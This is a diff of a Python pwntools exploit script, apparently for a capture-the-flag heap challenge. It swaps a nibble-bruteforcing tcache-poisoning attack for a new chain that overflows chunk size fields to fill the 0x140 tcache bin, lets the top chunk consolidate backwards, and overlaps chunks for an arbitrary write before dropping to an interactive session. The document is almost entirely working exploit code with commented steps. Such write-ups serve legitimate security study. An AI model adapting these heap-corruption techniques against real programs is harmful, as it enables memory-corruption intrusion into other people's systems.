@@ -18,6 +18,7 @@ def conn():
     elif args.GDB:
         r = gdb.debug(elf.path, '''
                                 b *challenge+51
+                                ignore 1 26
                                 continue
                       ''')
     else:
@@ -42,58 +43,43 @@ def check(io):
 
 def main():
     r = conn()
-    
-    # poison size of next 0x30 chunk
-    alloc(r, 0x18, b'A'*0x18 + p64(0x61), new_line=False)
-    free(r)
-    
-    alloc(r, 0x28, b'B'*0x28 + p64(0x81), new_line=False) # poison size of next 0x40 chunk
-    alloc(r, 0x28, b'C'*0x27) # poisoned chunk, when freed will overlap with next 0x30 chunk
+    # fill tcache for 0x140 chunks (0x140 is the offset from the last 0xb0 chunk to the top chunk, and also it is big enough to not go into fastbins)
+    alloc(r, 0x18, b'a'*0x18 + p64(0x141), new_line=False)
+    alloc(r, 0x18, b'a'*0x18 + p64(0x141), new_line=False)
     free(r)
     free(r)
     
-    # put the 0x80 poisoned chunk into tcache bins
+    alloc(r, 0x28, b'a'*0x28 + p64(0x141), new_line=False)
+    alloc(r, 0x28, b'a'*0x28 + p64(0x141), new_line=False)
+    free(r)
+    free(r)
+    
+    alloc(r, 0x38, b'a'*0x38 + p64(0x141), new_line=False)
+    alloc(r, 0x38, b'a'*0x38 + p64(0x141), new_line=False)
+    free(r)
+    free(r)
+    
+    alloc(r, 0x48, b'a'*0x48 + p64(0x141), new_line=False)
+    alloc(r, 0x48, b'a'*0x48 + p64(0x141), new_line=False)
+    free(r)
+    free(r)
+    # at this point the 0x140 tcache bin has been filled
+    
+    alloc(r, 0xa8, b'')
+    alloc(r, 0xa8, b'a'*0xa8 + p64(0x141), new_line=False)
+    free(r)
+    free(r)
+    
+    # at this point the top chunk will have consolidated backwards to the freed 0x140 chunk (ex last 0xb0 chunk)
+    alloc(r, 0x48, b'')
+    alloc(r, 0x48, b'')
+    free(r)
+    free(r)
     alloc(r, 0x38, b'')
-    alloc(r, 0x38, b'')
-    free(r)
-    free(r)
+    alloc(r, 0x38, p64(0xdeadbeefdeadbeef)*7, new_line=False) # this will write where target points
     
-    # poison the next 0x40 chunk size
-    alloc(r, 0x78, b'A'*0x38 + p64(0x31), new_line=False)
-    free(r)
-    
-    # put the 0x30 poisoned chunk into tcache bins
-    alloc(r, 0x28, b'')
-    alloc(r, 0x38, b'')
-    free(r)
-    free(r)
-    
-    # overwrite chunk next ptr to target address
-    alloc(r, 0x58, b'A'*0x28 + p64(0x31) + b'\xe0\x0a', new_line=False)
-    free(r)
-    
-    # put target address into tcache bins
-    alloc(r, 0x28, b'')
-    
-    # allocate chunk at target address
-    log.info("Overwriting target address with 0xdeadbeefdeadbeef")
-    try:
-        alloc(r, 0x28, p64(0xdeadbeefdeadbeef)*4, new_line=False)
-    except EOFError:
-        r.close()
-        raise
-    
-    log.info("Calling check")
     check(r)
-    
-    print(r.recvall(timeout=1).decode())
-    r.close()
+    r.interactive()
 
 if __name__ == "__main__":
-    print('running the exploit a few times to make it work, we are bruteforcing one nibble in the heap')
-    while True:
-        try:
-            main()
-            break
-        except Exception as e:
-            print(f"Brute force went wrong, retrying... {e}")
+    main()
